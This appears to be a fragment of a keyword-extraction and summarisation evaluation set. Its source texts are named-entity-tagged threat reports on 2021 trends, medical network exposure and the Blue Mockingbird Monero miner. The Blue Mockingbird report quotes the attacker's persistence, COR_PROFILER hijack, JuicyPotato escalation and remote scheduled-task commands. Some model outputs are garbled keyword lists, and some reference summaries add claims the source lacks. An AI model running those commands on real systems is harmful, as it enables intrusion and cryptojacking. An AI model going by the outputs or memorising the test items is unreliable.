[DATE] Feb. [DATE] 9 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c What Is Zero Trust and Why Does It Matter ? \u201d Accessed on [DATE] Jan. [DATE] 30 , [DATE] 2022 , at url [ORG] Security [ORG] Magazine . ( [DATE] May [DATE] 4 , [DATE] 2021 ) . [ORG] Security [ORG] Magazine . \u201c Cybersecurity workforce minimally impacted by pandemic , butstill grappling with persistent hiring challenges . \u201d Accessed on [DATE] Feb. [DATE] 11 , [DATE] 2022 , at url articles/95123 - cybersecurity - workforce - minimally - impacted - by - pandemic - but - still - grappling - with - persistent - hiring- challenges.104 [PERSON] Danny [PERSON] Palmer . ( [DATE] Aug. 2 , [DATE] 2021 ) . ZDNet . \u201c The cybersecurity jobs crisis is getting worse , and companies are making basicmistakes with hiring . \u201d Accessed on [DATE] Feb. [DATE] 11 , [DATE] 2022 , at url worse - and - companies - are - making - basic - mistakes - with - hiring.105 [PERSON] Michael [PERSON] Paladino . ( [DATE] April [DATE] 16 , [DATE] 2021 ) . [PERSON] Forbes . \u201c [WORK_OF_ART] Breaking [WORK_OF_ART] Down [WORK_OF_ART] Data [WORK_OF_ART] Silos [WORK_OF_ART] Takes [WORK_OF_ART] A [WORK_OF_ART] Cultural [WORK_OF_ART] Shift . \u201d Accessed on [DATE] Feb. [DATE] 11 , [DATE] 2022 , aturl [ORG] Trend [ORG] Micro . ( [DATE] Oct. 29 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] The [WORK_OF_ART] Real [WORK_OF_ART] Frontiers [WORK_OF_ART] for [WORK_OF_ART] 2021 in [ORG] XDR . \u201d Accessed on [DATE] Feb. [DATE] 11 , [DATE] 2022 , at url [LOC] Scott [LOC] Ikeda . ( [DATE] Feb. 17 , [DATE] 2021 ) . [ORG] CPO [ORG] Magazine . \u201c Balancing the Challenges : Fear and Cost in Compliance With Regulations . \u201d Accessed on [DATE] Feb. [DATE] 11 , [DATE] 2022 , at url compliance - with - regulations.41 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual Cybersecurity ReportTREND MICROTM RESEARCH Trend Micro , a global leader in cybersecurity , helps to make the world safe for exchanging digital information . [ORG] Trend [ORG] Micro [ORG] Research is powered by experts who are passionate about discovering new threats , sharing key insights , and supporting efforts to stop cybercriminals . Our global team helps identify [CARDINAL] millions of threats [DATE] daily , leads the industry in vulnerability disclosures , and publishes innovative research on new threat techniques . We continually work to anticipate new threats and deliver thought - provoking research.www.trendmicro.com", "generated_text": "Trend Micro; 2021; the threat landscape; tactics; tactics; techniques; exploit; systems; the threat landscape; critical infrastructure; organizations; the threat actor; REvil1; Conti2; newer toolboxes; use; cyberespionage; cybermercenary groups; PDB; phishing scams; the rise; critical vulnerabilities; the vulnerability market; Vulnerabilities; Malicious actors; new lures; new lures; phishing scams; Phishing scams; clusters; compromised systems; a greater threat landscape; The threats; insight; automated attacks; a more hands-on, long-haul approach; targeted attacks.", "ref_text": "<START-1>The report provides an overview of the major cybersecurity threats and trends in 2021. Ransomware attacks grew more targeted, with modern ransomware groups like REvil and Conti moving away from widespread campaigns to focus on bigger, more profitable targets in critical industries like healthcare. Cloud environments saw rising threats, often due to misconfigurations that left servers and data vulnerable. Threat actors increasingly used sophisticated social engineering and upgraded tools for targeted attacks on businesses, government entities, and supply chains. Critical vulnerabilities like Log4Shell caused widespread exploits and issues patched flaws like ProxyLogon were still abused. Pandemic-related threats remained prevalent, evolving to use COVID-19 themes in phishing lures. Overall threat detections blocked by Trend Micro dropped around 20% from 2020, but certain threats like ransomware declined while malicious files spiked over 380%. Banking trojans and information stealers remained active infection vectors. The report highlights the need for a robust, layered security approach across cloud, network, email, endpoint and mobile environments. Trend Micro blocked over 94 billion threats in 2021. Key metrics showed spikes in blocked threats and reputation queries. The report emphasizes gaining visibility into the expanded attack surface and having adaptive threat monitoring and response capabilities to address persistent and emerging risks. It advises using security platforms that provide centralized visibility, analytics and automated protection. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4076086956521739, "gpt3/lexical/rouge_rouge2": 0.07103825136612023, "gpt3/lexical/rouge_rougeL": 0.1793478260869565, "gpt3/lexical/rouge_rougeLsum": 0.1793478260869565, "gpt3_generated_text": ["The 2021 Annual Cybersecurity Report by Trend Micro highlights the evolving threat landscape and tactics used by cybercriminals throughout the year. Ransomware actors, such as REvil1 and Conti2, have become more deliberate in their attacks, targeting critical industries and using newer toolboxes to maximize their impact. Targeted attacks have also gained popularity among cyberespionage and cybermercenary groups, who have upgraded their toolsets for more effective operations. Phishing scams remain a staple in cyberattacks, with malicious actors using new lures inspired by the global pandemic. The report emphasizes the importance of patching vulnerabilities, as both old and new flaws continue to be exploited by attackers. Cloud adopters and remote workers face rising threats due to misconfigurations in cloud environments, as demonstrated by TeamTNT's abuse of improperly configured servers. The article emphasizes the need for organizations to continuously assess and enhance their security postures to navigate the ever-changing threat landscape effectively."]}, {"split_name": "val", "sample_id": "val_76", "prompt_text": "Extract the keywords: connected medicineBy [PERSON] Denis [PERSON] Makrushin , [PERSON] Yury [PERSON] Namestnikov on [DATE] March 13 , [DATE] 2018 . [TIME] 3:00 [TIME] pmSMART MEDICINE BREACHES ITS \u201c [ORDINAL] FIRST DO NO [ORG] HAR \u2026 #TheSAS2017 presentation : [ORG] Smart [ORG] Medicine Breaches Its \u201c [ORDINAL] First Do NoHarm \u201d [ORG] PrincipleAt [DATE] last [DATE] year \u2019s Security Analyst Summit [DATE] 2017 we predicted that medical networks would be a titbit for cybercriminals . Unfortunately , we were right . The numbers of medical data breaches and leaks are increasing . According to public data , [DATE] this [DATE] year is no exception . For [DATE] a [DATE] year we have been observing how cybercriminals encrypt medical data and demand a ransom for it . How they penetrate medical networks and ex\ufb01ltrate medical information , and how they \ufb01nd medical data on publicly available medical resources . The number of medical data breaches and leaks per year ( source : HIPAAJournal)Opened doors in medical networksTo \ufb01nd a potential entry point into medical infrastructure , we extract the [ORG] IP ranges of all organizations that have the keywords \u201c medic \u201d , \u201c clinic \u201d , \u201c hospit \u201d , \u201c surgery \u201d and \u201c healthcare \u201d in the organization \u2019s name , then we start the masscan ( port scanner ) and parse the specialized search engines ( like [GPE] Shodan and [ORG] Censys ) for publicly available resources of these organizations . [NORP] Masscan report extractOf course , medical perimeters contain a lot of trivial opened ports and services : like web - server , [ORG] DNS - server , mail - server etc . And you know that \u2019s just the tip of the iceberg . The most interesting part is the non- trivial ports . We left out trivial services , because as we mentioned in our previous article those services are out of date and need to be patched . For example , the web applications of electronic medical records that we found on the perimeters in most cases were out of date . The most popular ports are the tip of the iceberg . The most interesting part is the non - trivial ports . The most popular opened ports on medical perimeters ( [CARDINAL] 18,723 live hosts;27,716 opened ports)Using ZTag tool and [ORG] Censys , we identify what kinds of services are hidden behind these ports . If you try to look deeper in the embedded tag you will see di\ufb00erent stu\ufb00 : for example printers , [ORG] SCADA - type systems , [ORG] NAS etc . Top services on medical network perimetersExcluding these trivial things , we found [ORG] Building [ORG] Management systems that out of date . Devices using the Niagara Fox protocol usually operate on [ORG] TCP ports [DATE] 1911 and [DATE] 4911 . They allow us to gather information remotely from them , such as application name , [PERSON] Java version , host OS , time zone , local [ORG] IP address , and software versions involved in the stack . Example of extracted information about [PERSON] Niagara [PERSON] Fox serviceOr printers that have a web interface without an authentication request . The dashboard available online and allows you to get information about internal Wi - Fi networks or , probably , it allows you to get info about documents that appeared in \u201c Job Storage \u201d logs . [PERSON] Shodan told us that some medical organizations have an opened port [DATE] 2000 . It \u2019s a smart kettle . We do n\u2019t know why , but this model of kettle is very popular in medical organizations . And they have publicly available information about a vulnerability that allows a connection to the kettle to be established using a simple pass and to extract info about the current Wi - Fi connection . Medical infrastructure has a lot of medical devices , some of them portable . And devices like spirometers or blood pressure monitors support the [ORG] MQTT protocol to communicate with other devices directly . [CARDINAL] One of the main components of the [ORG] MQTT communication \u2013 brokers ( see here for detailed information about components ) are available through the Internet and , as a result , we can \ufb01nd some medical devices online . Not only [ORG] Smart [ORG] Home components , but also medical devices are availablevia [ORG] MQTT [ORG] SpirometerThreats that a\ufb00ect medical [ORG] networksOK , now we know how they get in . But what \u2019s next ? Do they search for personal data , or want to get some money with a ransom or maybe something else ? Money ? It \u2019s possible \u2026 anything is possible . Let \u2019s take a look at some numbers that we collected during [CARDINAL] 2017.The statistics are a bit worrying . [PERCENT] More [PERCENT] than 60 % of medical organizations had some kind of malware on their servers or computers . The good news is that if we count something here , it means we \u2019ve deleted malware in the system . Attacks detected in medical organizations , 2017And there \u2019s something even more interesting \u2013 organizations closely connected to hospitals , clinics and doctors , i.e. the pharmaceutical industry . Here we see even more attacks . The pharmaceutical industry means \u201c money \u201d , so it \u2019s another titbit for attackers . Attacks detected in pharmaceutical organizations , 2017Let \u2019s return to our patients . Where are all these attacked hospitals and clinics ? Ok , here we the numbers are relative : we divided the number of devices in medical organizations in the country with our AV by the number of devices where we detected malicious code . The TOP [CARDINAL] 3 were the [GPE] Philippines , [GPE] Venezuela and [GPE] Thailand . [GPE] Japan , [GPE] Saudi [GPE] Arabia and [GPE] Mexico took the last [CARDINAL] three spots in the TOP [CARDINAL] 15.So the chances of being attacked really depend on how much money the government spends on cybersecurity in the public sector and the level of cybersecurity awareness . Attacked devices in medical organizations , TOP [CARDINAL] 15 countriesIn the pharmaceutical industry we have a completely di\ufb00erent picture . [ORDINAL] First place belongs to [GPE] Bangladesh . I googled this topic and now the statslook absolutely ok to me . Bangladesh exports meds to [LOC] Europe . In [GPE] Morocco big pharma accounts for 14 % of GDP . [GPE] India , too , is in the list , and even some [NORP] European countries are featured . Attacked devices in pharmaceutical organizations , TOP [CARDINAL] 15 countriesOn [CARDINAL] one in [CARDINAL] ten devices and in [PERCENT] more [PERCENT] than 25 % of medical and 10 % of pharmaceutical companies we detected hacktools : pentesting tools like [PERSON] Mimikatz , [GPE] Meterpreter , tweaked remote administration kits , and so on . Which means that either medical organizations are very mature in terms of cybersecurity and perform constant audits of their own infrastructure using red teams and professional pentesters , or , more likely , their networks are infested with hackers . Hacktools : Powerpreter , Meterpreter , [ORG] Remote admin , etc . APTOur research showed that [ORG] APT actors are interested in information from pharmaceutical organizations . We were able to identify victims in [LOC] South [LOC] East [LOC] Asia , or more precisely , in [GPE] Vietnam and [GPE] Bangladesh . The criminals had targeted servers and used the infamous PlugX malware or Cobalt Strike to ex\ufb01ltrate data . PlugX RAT , used by [LANGUAGE] Chinese - speaking [ORG] APT actors , allows criminals to perform various malicious operations on a system without the user \u2019s knowledge or authorization , including but not limited to copying and modifying \ufb01les , logging keystrokes , stealing passwords and capturing screenshots of user activity . PlugX , as well as [PERSON] Cobalt [PERSON] Strike , is used by cybercriminals to discreetly steal and collect sensitive or pro\ufb01table information . During our research we were unable to track the initial attackvectors , but there are signs that they could be attacks exploiting vulnerable software on servers . Taking into account the fact that hackers placed their implants on the servers of pharmaceutical companies , we can assume they are after intellectual property or business plans . How to live with itRemove all nodes that process medical data from public Periodically update your installed software and remove unwanted applications Refrain from connecting expensive equipment to the main [ORG] LAN of your organizationMore tips at \u201c [WORK_OF_ART] Connected [WORK_OF_ART] Medicine [WORK_OF_ART] and [WORK_OF_ART] Its [WORK_OF_ART] Diagnosis\u201c . INFRASTRUCTURE INTERNET OF THINGSShare post on : SECURITY POLICIESRelated [PERSON] Posts\uf09a [PERSON] \uf0d5 \uf099Somebody \u2019s are more than just \u2018 smart\u2019IoT hack : how to break a smart home \u2026 againGas is too expensive ? Let \u2019s make it cheap !", "generated_text": "port scanner; a potential entry point; medical networks; 22; the 15; the first; no harm; the second; victims; the healthcare infrastructure; medical devices; the MQTT protocol; the MQTT S; devices; the network; a vulnerability; a connection; MQTT S requests; the NI; passwords; phishing; encryption; IP; data; C2; port; fees; a ransom; companies; the hospitals; the ransomware; a ransomware payload; the payment; ransomware; the attackers; the legal entities; the risk; the ransomware; the healthcare infrastructure; an entry point.", "ref_text": "<START-1>The document discusses security issues and threats facing medical and healthcare organizations' networks and devices. It notes that breaches of medical data are increasing each year. The report explores potential entry points into medical infrastructure by scanning IP ranges of healthcare organizations. It finds many exposed services likeprinters, building management systems, and smart devices. Over 60% of medical organizations and even more pharmaceutical companies detected malware in 2017. The top targeted countries include the Philippines, Venezuela, Thailand, Bangladesh, and India. The presence of hacking tools in 25% of medical and 10% of pharma networks suggests they are compromised. APT groups have targeted pharma companies in Vietnam and Bangladesh using PlugX and Cobalt Strike, likely to steal intellectual property and business plans. The report recommends security measures like removing nodes with patient data from the public internet, regularly updating software, avoiding connecting expensive medical devices to the main network, and other best practices. In summary, the document examines the vulnerable state of medical device and healthcare industry security, evidence of compromises by cybercriminals and APTs, and the geographic targeting, concluding significant risks exist that require implementing security strategies. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.44510385756676557, "gpt3/lexical/rouge_rouge2": 0.1373134328358209, "gpt3/lexical/rouge_rougeL": 0.24925816023738873, "gpt3/lexical/rouge_rougeLsum": 0.24925816023738873, "gpt3_generated_text": ["The article discusses the increasing number of data breaches and leaks in the healthcare industry and the vulnerability of medical networks to cybercriminals. The authors describe how they identified potential entry points into medical infrastructure by scanning IP ranges of organizations related to healthcare. They found that many medical perimeters had trivially opened ports and services that were out of date and needed patching. They also discovered non-trivial ports that contained devices such as printers and Building Management systems that were not properly secured. The authors highlight the risks associated with these vulnerabilities, including malware attacks and the potential for cybercriminals to access personal data or demand a ransom. They provide statistics showing that over 60% of medical organizations had some kind of malware on their servers or computers in 2017. The article emphasizes the need for improved security measures in the healthcare industry to protect against these threats."]}, {"split_name": "val", "sample_id": "val_77", "prompt_text": "Extract the keywords: 5/26/2020On [DATE] June [DATE] 17 , learn detection strategies for Process Injection \u2014 the # [MONEY] 1 most prevalent [PERSON] ATT&CK \u00ae technique we 've seen to date . LEARN MOREBlue Mockingbird activity mines [PERSON] Monero cryptocurrencyCONTACT [ORG] USIntroducing [ORG] Blue [ORG] MockingbirdRed [ORG] Canary [ORG] Intel is monitoring a potentially novel threat that is deploying [PERSON] Monero cryptocurrency - mining payloads on Windows machines at multiple organizations . [DATE] MAY 7 , [DATE] 2020 \u2022 DETECTION AND RESPONSE TONY LAMBERTBlue Mockingbird is the name we \u2019ve given to a cluster of similar activity we \u2019ve observed involving [PERSON] Monero cryptocurrency- mining payloads in dynamic - link library ( [ORG] DLL ) form on Windows systems . They achieve initial access by exploiting public- facing web applications , specifically those that use Telerik UI for ASP.NET , followed by execution and persistence using multiple techniques ( check out my colleague [PERSON] Jesse Brown \u2019s new blog for details on [ORG] Blue [ORG] Mockingbird \u2019s COR_PROFILER persistence mechanism ) . During [CARDINAL] at [CARDINAL] least [CARDINAL] one incident , the adversary used proxying so ware and experimented with di erent kinds of reverse shell payloads to connect to external systems . The earliest [ORG] Blue [ORG] Mockingbird tools we \u2019ve observed were created in [DATE] December 2019.Gaining entryIn [CARDINAL] at [CARDINAL] least [CARDINAL] two incident response ( IR ) engagements , [ORG] Blue [ORG] Mockingbird has exploited public - facing web applications ( T1190 : [ORG] Exploit Public - Facing [ORG] Application ) that implemented Telerik UI for ASP.NET AJAX . This suite of user interface components accelerates the web development process , but some versions are susceptible to a deserialization vulnerability , CVE-2019- [DATE] 18935 . The exploitation of this [ORG] CVE is not unique to [ORG] Blue [ORG] Mockingbird , but it has been a common point of [CARDINAL] entry.url Mockingbird activity mines [PERSON] Monero cryptocurrencyIn exploiting this vulnerability , [CARDINAL] two DLLs are uploaded to a web application running on a Windows IIS web server . In telemetry , investigators will notice w3wp.exe writing the DLLs to disk and then immediately loading them into memory a erward . In some cases , this will cause w3wp.exe to temporarily freeze and fail to successfully serve HTTP responses . For a diagnostic to determine whether you are potentially a ected by the Telerik CVE , you can search the [ORG] IIS access logs for the string [ORG] POST Telerik.Web.UI.WebResource.axd . In victim environments , our [ORG] IR partners found entries similar to /Telerik . Web . [ORG] UI.WebResource.axd type = rau [CARDINAL] 80 - Mozilla/5.0 + ( Windows+NT+10.0;+Win64;+x64;+rv:54.0)+Gecko/20100101+Firefo - 200 0 0 625 /Telerik . Web . [ORG] UI.WebResource.axd type = rau [CARDINAL] 80 - Mozilla/5.0 + ( Windows+NT+10.0;+Win64;+x64;+rv:54.0)+Gecko/20100101+Firefo - 500 0 0 46In the entries , the string [CARDINAL] 200 refers to HTTP response code [CARDINAL] 200 where the [ORG] POST request was successful , and the string [CARDINAL] 500 refers to HTTP code [CARDINAL] 500 where the [ORG] POST request was not processed successfully by the web server . These code [CARDINAL] 500 entries happened when the w3wp.exe process loaded the uploaded DLLs into memory and temporarily froze . Searching the [ORG] IIS access logs for entries like these is a good idea even if you do n\u2019t explicitly know whether you use Telerik UI , as some web applications require the suite as a dependency behind the scenes . If you have endpoint detection and response ( [ORG] EDR ) or similar tools , you \u2019ll notice cmd.exe or other suspicious processes spawning from w3wp.exe . Execution and evasionThe primary payload distributed by [ORG] Blue [ORG] Mockingbird is a version of [ORG] XMRIG packaged as a [ORG] DLL . [ORG] XMRIG is a popular , open- source [PERSON] Monero - mining tool that adversaries can easily compile into custom tooling . During the incidents , we noted [CARDINAL] three distinct uses . The [ORDINAL] first use was execution with rundll32.exe explicitly calling the [ORG] DLL export fackaaxv ( T1218.011 : [PERSON] Rundll32 ) . This export seems unique to this actor \u2019s payloads and does n\u2019t seem to happen other places in the wild : rundll32.exe dialogex.dll , fackaaxvThe next use was execution using regsvr32.exe using the /s command - line option ( T1218.010 : [PERSON] Regsvr32 ) . Supplying the /s switch executes the DllRegisterServer export exposed by the [ORG] DLL payload . This export ultimately passed control of execution into the function that fackaax exported : url [PERSON] Mockingbird activity mines [PERSON] Monero cryptocurrencyregsvr32.exe /s dialogex.dllThe final execution path was with the payload configured as a Windows Service [ORG] DLL ( T1569.002 : Service Execution ) . Once configured , execution of the service invoked the export [ORG] ServiceMain , which again passed control to fackaaxv . Come for the exploit , stay for the miningBlue Mockingbird leveraged multiple techniques for persistence during incidents . The most novel technique was the use of a COR_PROFILER COM hijack to execute a malicious [ORG] DLL and restore items removed by defenders ( T1559.001 : Component Object Model ) . To use [ORG] COR_PROFILER , they used wmic.exe and Windows Registry modifications to set environment variables and specify a [ORG] DLL payload.wmic ENVIRONMENT where \" name='COR_PROFILER ' \" wmic ENVIRONMENT create name=\"COR_ENABLE_PROFILING\",username=\"\",VariableValue=\"1 \" wmic ENVIRONMENT create name=\"COR_PROFILER\",username=\"\",VariableValue= \" \" [PERSON] REG.EXE ADD HKEY_LOCAL_MACHINE\\Software\\Classes\\CLSID\\\\InProcServer32 /V [ORG] ThreadingModel /T REG_SZ /D Apartment /F [PERSON] REG.EXE [PERSON] ADD HKEY_LOCAL_MACHINE\\Software\\Classes\\CLSID\\\\InProcServer32 /VE /T REG_SZ /D \" c:\\windows\\System32\\e0b3489da74f.dll \" /FThe payload [ORG] DLL specified as a COR_PROFILER was simple and gathered few antivirus detections . It executed the following command : cmd.exe /c sc config wercplsupport start= auto & & sc start wercplsupport & & copy c:\\windows\\System32\\dialogex.dll c:\\windows\\System32\\wercplsupporte.dll /y & & schtasks /create /tn \" [WORK_OF_ART] Windows [WORK_OF_ART] Problems [WORK_OF_ART] Collection \" /tr \" regsvr32.exe /s c:\\windows\\System32\\wercplsupporte.dll \" /sc [PERSON] DAILY /st [CARDINAL] 20:02 /F /RU [ORG] System & & start \" \" regsvr32.exe /s c:\\windows\\System32\\dialogex.dllurl Mockingbird activity mines [ORG] Monero cryptocurrencySince [PERSON] COR_PROFILER was configured , every process that loaded the [NORP] Microso   .NET Common Language Runtime would execute the command above , re - establishing persistence . The command configured [ORG] the [ORG] Windows [ORG] Problem [ORG] Reports and [ORG] Solutions [ORG] Control [ORG] Panel [ORG] Support service to execute automatically at boot ( T1543.003 : Windows Service ) . In a separate command , the actor modified the existing wercplsupport service to use the miner [ORG] DLL instead of the legitimate [CARDINAL] one : reg add \" HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\wercpl /f /v [ORG] ServiceDll /t REG_EXPAND_SZ /d \" c:\\windows\\System32\\wercplsupporte.dll\"Note that the actor used the [ORG] DLL name wercplsupporte.dll as an attempt to masquerade as the legitimate [ORG] DLL name , which is [DATE] wercplsupport.dll ( T1036.005 : [PERSON] Match [PERSON] Legitimate [PERSON] Name or [ORG] Location ) . In addition , more masquerading was used to make malicious Scheduled Tasks blend in with legitimate ones ( T1053.005 : Scheduled Task).In some cases , the actor even created a new service to perform the same actions as the COR_PROFILER payload : sc create [DATE] 8995 binPath= \" cmd /c sc config wercplsupport start= auto & sc start wercplsupport & copy c:\\windows\\System32\\8995.dll c:\\windows\\System32\\wercplsupporte.dll /y & regsvr32.exe /s c:\\windows\\System32\\8995.dll \" [CARDINAL] type= share start= auto error= ignore DisplayName= 8995Escalating privileges and accessing credentialsIt \u2019s worth noting that [ORG] Blue [ORG] Mockingbird \u2019s initial access does not provide the privileges needed to establish the many persistence mechanisms used . In [CARDINAL] one engagement we observed , the adversary using a [ORG] JuicyPotato exploit to escalate privileges from an [ORG] IIS [ORG] Application [ORG] Pool [ORG] Identity virtual account to the NT Authority\\SYSTEM account . [ORG] JuicyPotato allowsurl [ORG] Mockingbird activity mines [PERSON] Monero cryptocurrencyan attacker to abuse the SeImpersonate token privilege and Windows DCOM to move from an unprivileged account to the highest level of privilege on a system ( T1068 : [ORG] Exploitation [ORG] for [ORG] Privilege [ORG] Escalation ) . During this engagement , the attacker abused a [ORG] DCOM class and leveraged [ORG] the [ORG] IIS [ORG] Application [ORG] Pool [ORG] Identity \u2019s [ORG] SeImpersonate privilege to perform the escalation : c:\\programdata\\let.exe -t t -p c:\\programdata\\rn.bat -l [DATE] 1234 -c { 8BC3F05E - D86B- 11D0 - A075 - 00C04FB68820}In another engagement , we observed the adversary using [PERSON] Mimikatz ( the o icial signed version ) to access credentials for logon ( T1003.001 : LSASS Memory).Free to move around the networkAs with other adversaries that mine cryptocurrency opportunistically , [ORG] Blue [ORG] Mockingbird likes to move laterally and distribute mining payloads across an enterprise . We observed [ORG] Blue [ORG] Mockingbird move laterally using a combination of [ORG] the [ORG] Remote [ORG] Desktop [ORG] Protocol to access privileged systems and Windows Explorer to then distribute payloads to remote systems ( T1021.001 Remote Desktop Protocol , T1021.002 SMB / Windows Admin Shares ) . In some cases , Scheduled Tasks were created remotely with schtasks.exe /S to ensure execution.schtasks /create /tn \" setup service Management \" /tr \" c:\\windows\\temp\\rn.bat \" /sc ONCE /st [TIME] 00:00 /F /RU System /S [ORG] remote_hostA look at command and controlA novel aspect of this adversary is that their toolkit does not appear to be fully defined . In [CARDINAL] at [CARDINAL] least [CARDINAL] one engagement , we observed [ORG] Blue [ORG] Mockingbird seemingly experimenting with di erent tools to create SOCKS proxies ( T1090 : [PERSON] Proxy ) for pivoting . These tools included a fast reverse proxy ( frp ) , [ORG] Secure [ORG] Socket [ORG] Funneling ( SSF ) , and [GPE] Venom . In [CARDINAL] one instance , the adversary also tinkered with [ORG] PowerShell reverse [ORG] TCP shells and a reverse shell in [ORG] DLL form ( T1059.001 : PowerShell).Take actionurl [ORG] Mockingbird activity mines [PERSON] Monero cryptocurrencyWe\u2019ve scratched the surface on the [ORG] XMRIG DLL payload , but we can dive deeper to understand more details ( T1496 : Resource Hijacking ) . [ORDINAL] First , the export fackaaxv has been consistently present in the DLLs . Next , each [ORG] DLL also contains a [ORG] PE binary section _ RANDOMX . This section appears unique to cryptocurrency - mining payloads because it houses the RandomX proof of work algorithm that [ORG] XMRIG may use . The network connections made for mining usually involve a nanopool[.]org domain . We made the assessment that the payload was actually [ORG] XMRIG based on several pieces of evidence . [ORDINAL] First , there were multiple references to \u201c xmrig \u201d , including version numbers , in the binary strings . These were accompanied by cleartext references to command - line options common to [ORG] XMRIG : coindonate - levelmax - cpu - usagecpu - prioritylog - fileThe final piece of evidence came from a text log written to disk by some versions of the miner [ORG] DLL . In the text logs , identifying information for [ORG] XMRIG was output alongside hardware details for the victim system . * ABOUT XMRig/5.3.0 [GPE] MSVC/2015 * LIBS libuv/1.31.0 OpenSSL/1.1.1c hwloc/2.1.0 * HUGE PAGES unavailable * [CARDINAL] 1 GB PAGES unavailableurl [ORG] Mockingbird activity mines [PERSON] Monero cryptocurrency * CPU Intel(R ) Core(TM ) i7 - 4770 CPU @ 3.40GHz ( [CARDINAL] 1 ) x64 AES L2:0.3 MB L3:8.0 MB 1C/1 T NUMA:1 * MEMORY 1.3/4.0 GB ( 33 % ) * POOL # 1 xmr-au1.nanopool.org:14433 coin * [ORG] COMMANDS ' h ' hashrate , ' p ' pause , ' r ' [ [DATE] 2020 - 04 - 16 08:30:26.753 ] [ xmr- au1.nanopool.org:14433 ] [ORG] DNS error : \" unknown node or service\"Each payload comes compiled with a standard list of commonly used [PERSON] Monero - mining domains alongside a [PERSON] Monero wallet address . So far , we \u2019ve identified [CARDINAL] two wallet addresses used by [ORG] Blue [ORG] Mockingbird that are in active circulation . Due to the private nature of [PERSON] Monero , we can not see the balance of these wallets to estimate their success . We \u2019ve seen mining payloads compiled [DATE] as [DATE] early [DATE] as [DATE] December [DATE] 2019 and as recently as [DATE] late [DATE] April [DATE] 2020 . In each compilation , [CARDINAL] one of the [CARDINAL] two wallets has been embedded into the binary . The wallet addresses could be extracted from the binaries easily in earlier versions using a simple strings command . In newer versions , the string is obfuscated . Even with string obfuscation in the binary , you can observe the wallet addresses in network tra ic . During execution of the techniques used by [ORG] Blue [ORG] Mockingbird will bypass whitelisting technologies , so the best route will be to inhibit initial access . Consider establishing a baseline of [WORK_OF_ART] Windows [WORK_OF_ART] Scheduled [WORK_OF_ART] Tasks in your environment to know what is normal across your enterprise . Let \u2019s collaborate!If you \u2019ve been tracking similar activity , we \u2019d love to hear from you and collaborate . Contact blog@redcanary.com with any time12/19/2019 17:49:201/4/2020 12:00:232/6/2020 10:24:292/6/2020 10:24:292/19/2020 13:52:102/22/2020 14:38:333/8/2020 16:57:323/24/2020 time3/24/2020 [CARDINAL] 16:15:444/9/2020 16:05:454/14/2020 19:00:062020 - 04 - 26 14:58:24compile 9:24:302020 - 02- [DATE] 22 [DATE] ARTICLESMAY 7 , [DATE] 2020 DETECTION AND RESPONSEDetecting COR_PROFILER manipulation for persistenceurl [PERSON] Mockingbird activity mines [ORG] Monero [ORG] cryptocurrencyAPRIL 28 , [DATE] 2020 DETECTION AND RESPONSELateral Movement with [PERSON] Secure [PERSON] Shell ( SSH)MARCH 26 , 2020 DETECTION AND RESPONSE2020 Threat Detection Report : the conversation continuesMARCH 18 , [DATE] 2020 DETECTION AND RESPONSEWorms shape the narrative in [ORG] Red [ORG] Canary \u2019s [ORG] 2020 [ORG] Threat [ORG] Detection [ORG] ReportSubscribe to our blogEmail AddressSUBSCRIBESee what it 's likeDemourl have a partner in the fight . [ORG] Blue [ORG] Mockingbird activity mines [PERSON] Monero cryptocurrencyExperience the di erence between a sense of security and actual security . PRODUCTSSOLUTIONSRESOURCESBLOGATOMIC RED TEAMCOMPANYCONTACT USDEMOSUBSCRIBE TO OUR NEWSLETTER \u00a9 2014 - [DATE] 2020 Red Canary . All rights reserved.info@redcanary.com+1 [CARDINAL] 855 - 977 - 0686Privacy Policyurl", "generated_text": "Blue Mockingbird; activity; Monero cryptocurrency-mining payloads; DLLs; Windows systems; EXE; public-facing web applications; Telerik UI; AJAX; the CVE-2019-18935; a deserialization vulnerability; the web development process; the DLLs; disk; the payload; persistence; the attacker; DNS defenders; ports; the COR_PROFILER persistence mechanism; a variety; reverse shell payloads; IP; detection; ATT&CK techniques; analysis.", "ref_text": "<START-1>The document describes a threat actor called Blue Mockingbird that has been deploying Monero cryptocurrency mining malware on Windows machines across multiple organizations. Blue Mockingbird gains initial access by exploiting the CVE-2019-18935 vulnerability in Telerik UI web applications. The attacker leverages the privileges of a DCOM class and IIS Application Pool Identity's SeImpersonate privilege to perform the escalation. Once in, they use various techniques like process injection, DLL sideloading, and privilege escalation to deploy and persist a malicious Monero miner built on XMRig. The miner payload communicates with external mining pools to mine Monero. Blue Mockingbird uses lateral movement techniques like RDP and Windows admin shares to distribute the payload across the network. Blue Mockingbird appears to experiment with different tools, such as Fast Reverse Proxy (frp), Secure Socket Funneling (SSF), and Venom, to pivot between systems. They have also experimented with different reverse shell and proxy tools for command and control. Persistence mechanisms involve hijacking services like wercplsupport using COR_PROFILER COM hijacking. The malware compiles each payload with a list of commonly used Monero-mining domains and a wallet address, which can be extracted from the binary or observed in network traffic. Red Canary provides indicators of compromise like file hashes, Monero wallet addresses, and analytics to detect the miner payloads, privilege escalation, and lateral movement. They also advise patching public-facing apps and establishing a baseline of normal scheduled tasks. In summary, the document analyzes a sophisticated, evolving threat actor distributing stealthy cryptocurrency miners using multiple intrusion techniques across victim networks. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.402088772845953, "gpt3/lexical/rouge_rouge2": 0.09973753280839895, "gpt3/lexical/rouge_rougeL": 0.20365535248041775, "gpt3/lexical/rouge_rougeLsum": 0.20365535248041775, "gpt3_generated_text": ["Blue Mockingbird is a new threat that deploys Monero cryptocurrency-mining payloads on Windows machines. The activity involves the use of DLLs and exploits public-facing web applications that use Telerik UI for ASP.NET. The attackers gain entry by exploiting a deserialization vulnerability (CVE-2019-18935) in Telerik UI. They upload DLLs to the web application, causing w3wp.exe to write them to disk and load them into memory. The primary payload used by Blue Mockingbird is XMRIG, a popular open-source Monero-mining tool. The payload is executed using rundll32.exe or regsvr32.exe. The article provides details on the techniques used by Blue Mockingbird and recommends detection strategies for Process Injection, which is the most prevalent ATT&CK technique associated with this threat."]}, {"split_name": "val", "sample_id": "val_78", "prompt_text": "Extract the keywords: Operation GreedyWonk : 